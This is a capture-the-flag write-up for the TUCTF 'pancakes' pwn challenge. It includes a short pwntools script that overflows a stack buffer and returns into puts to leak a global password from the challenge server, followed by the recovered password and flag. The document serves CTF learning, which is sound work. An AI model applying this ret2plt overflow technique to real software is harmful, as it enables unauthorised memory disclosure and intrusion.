# pancakes

## PWN - Points: 500

> You ever just get a craving for pancakes?
>
> 
>
> nc chal.tuctf.com 30503
>
> [pancakes](pancakes)
>

Overflow the buffer and setup a `puts` call to print the content of the global `password`.

```python
from pwn import *


e = ELF('pancakes')

# p = process('pancakes')
p = remote('chal.tuctf.com', 30503)

p.sendlineafter('> ', 'A' * 44 + p32(e.plt['puts']) + 'AAAA' + p32(e.symbols['password']))
print p.recvall()
```

password: `l0r3m_1p5um_d0l0r_517_4m37`

flag: `TUCTF{p4nc4k35_4r3_4b50lu73ly_d3l1c10u5_4nd_y0u_5h0uld_637_50m3_4f73r_7h15}`